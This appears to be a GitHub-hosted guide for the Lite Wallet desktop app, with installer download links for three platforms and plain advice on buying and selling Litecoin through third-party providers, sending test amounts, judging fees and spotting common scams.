![Lite Wallet](assets/banner-article.png)

# Buy and sell Litecoin safely

The third parties behind the buttons, and how to cash out safely.

<p align="center"><a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe"><img src="assets/button-windows.png" alt="Download Lite Wallet for Windows"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-00D5FD?style=for-the-badge&labelColor=001116&logo=apple&logoColor=89EFFF" alt="Download Lite Wallet for macOS"></a> <a href="https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-00D5FD?style=for-the-badge&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Download Lite Wallet for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`litewallet-desktop-win-v3.15.2.exe`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-win-v3.15.2.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-00D5FD?style=flat-square&labelColor=001116&logo=apple&logoColor=89EFFF" alt="macOS"> | macOS 12 or later | [`litewallet-desktop-macos-v3.15.2.dmg`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-macos-v3.15.2.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-00D5FD?style=flat-square&labelColor=001116&logo=linux&logoColor=89EFFF" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`litewallet-desktop-linux-v3.15.2.zip`](https://github.com/litewallet-dev/litewallet-desktop/releases/download/v3.15.2/litewallet-desktop-linux-v3.15.2.zip) |

</div>

All versions, installers and checksums are on the [release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).

> Only download from this GitHub release page.

Buying Litecoin means acquiring LTC from a service that takes payment and sends coins to your address; selling means sending LTC to a service that pays you in currency. Lite Wallet handles the wallet side of both and routes in-app buy and sell flows to third-party providers, labelled before you confirm. The wallet never holds your funds or your identity.

## What the wallet does, and what a provider does

The wallet's role is narrow and worth understanding before the first purchase. It generates your address, receives the coins, and later sends them wherever you choose. The receiving half of that is covered in [the send and receive guide](https://github.com/litewallet-dev/litecoin-wallet-transactions/blob/main/how-to-send-litecoin-with-litewallet.md). A provider - an exchange, a broker, a card on-ramp - takes the payment, performs whatever identity checks its rules require, and sends LTC to the address you give it.

That split is why the wallet has no account and the provider does. Identity, payment methods and limits belong to the service; custody of the coins belongs to you from the moment they arrive.

| Step | Who does it | What they need from you |
|---|---|---|
| choose a provider | you | a comparison of fees and payment methods |
| identity check | the provider | whatever its rules require |
| payment | the provider | card, bank transfer or balance |
| delivery | the provider | your Litecoin address |
| custody afterwards | you | the 12-word paper key |

## Buying: the safe sequence

1. Create or open the wallet and copy a receive address.
2. Choose a provider and read its fee and its delivery terms.
3. Complete the provider's verification and payment.
4. Send the coins to your own address, not to an address someone gave you.
5. Confirm the transaction on a block explorer, then in the wallet once it syncs.
6. Write the paper key down if this is a new wallet - before the balance grows.

The most expensive mistake in this sequence is not a fee. It is leaving a balance on the provider because it felt convenient, or buying through a link someone sent. Custody is the whole point of moving the coins out.

## Selling: where the risk moves

Selling reverses the flow: you send LTC to a service, and it pays out in currency. The wallet's part ends when the transaction confirms, and from that moment you are relying on the counterparty's terms, processing time and solvency.

1. Choose a service you have verified, with a payout method you can actually use.
2. Generate the deposit address from the service's own interface, not from an email.
3. Send a small test amount first if the sum is large.
4. Send the remainder once the test arrives and credits.
5. Keep the transaction record until the payout lands.
6. Export the history for your records.

There is no chargeback and no reversal on-chain, so a mistaken deposit address is a loss. That is why the test amount exists: it costs a fee and it catches the error while it is still cheap.

## Recognising a scam before it costs anything

| Offer | Why it is a scam |
|---|---|
| "send LTC and receive double" | nothing doubles; the first send is the theft |
| a "support agent" who offers to help you buy | real support does not initiate contact |
| a provider link from a message or a video | the destination is chosen by the sender, not by you |
| a promise of fixed returns, or a trading bot | returns cannot be fixed, and bots that ask for deposits are theft |
| an address given in a chat for a private sale | there is no recourse once it confirms |

The common structure is a request to send first. Any offer that requires you to move coins before receiving something is a transfer of risk to you, and the counterparty's promise is the only thing backing it.

## Fees and what you actually pay

A purchase has at least two costs: the provider's fee or spread, and the network fee to deliver the coins. A sale has the same in reverse, plus whatever the payout method charges. The wallet's part is the address and the send; the provider's costs belong to the provider, and its quote is the number to read.

| Cost | Charged by | Visible before you commit |
|---|---|---|
| provider spread or commission | the provider | in its quote |
| card or bank fee | the payment provider | at checkout |
| network fee | the Litecoin network | in the wallet's send screen |
| payout fee | the selling service | in its terms |

Comparing providers on the quoted rate alone hides the spread. The number that matters is what arrives in your wallet against what you paid. *The fees guide* covers the network side, and [the swap guide](https://github.com/litewallet-dev/litecoin-wallet-transactions/blob/main/swap-litecoin-inside-litewallet.md) covers exchanging without a fiat step.

## Buying in small amounts versus one large one

The first purchase is a test, and it should be sized like one. Buy a small amount, withdraw it, confirm it arrives, send a little of it back out, and only then buy the amount you actually wanted. That sequence costs a couple of network fees and it validates the whole path: the provider delivers, the address is yours, and the wallet can spend.

Batching purchases has the opposite effect. One large buy and one withdrawal is cheaper in fees and simpler to record, and it is the right shape once the path is proven. What is not sensible is a large first purchase into an address you copied by hand, from a provider you have not used before, with a wallet you have not restored once to prove the backup works. Each of those is a small risk that compounds.

Once the coins are in the wallet, the security model is yours: a paper key written down, a device you control, and no one else able to move the balance. For a meaningful amount, a hardware wallet moves signing onto a device, and MWEB gives the option of private transfers later.

The one thing buying cannot give you is a recovery net. There is no account to reset and no custodian to call. *The paper key guide* is the page that matters after the first purchase, and [the safety guide](https://github.com/litewallet-dev/litecoin-wallet-setup/blob/main/is-litewallet-safe-to-use.md) explains the model in full.

## FAQ

### Can I buy Litecoin inside the app?

The wallet routes buy and sell flows to third-party providers, which are labelled before you confirm. The provider handles payment and verification; the coins arrive at your address.

### Who processes the payment?

The provider named in the flow. Its identity checks, payment methods, limits and fees are its own, and they are shown before you commit.

### How do I cash out?

Send LTC to a service that pays out in currency, from an address generated in that service's own interface. Test with a small amount first, and keep the transaction record until the payout arrives.

### Why does a provider need my ID?

Because it is a regulated service handling fiat currency. The wallet does not collect identity; the provider does, according to its own rules and jurisdiction.

### Is it safe to buy from someone in a chat group?

No. A private sale has no recourse and no verification, and the on-chain transfer is irreversible. Use a service with a track record, and send to your own address.

Buy and sell routing ships in the current release, published on [the release page](https://github.com/litewallet-dev/litewallet-desktop/releases/tag/v3.15.2).
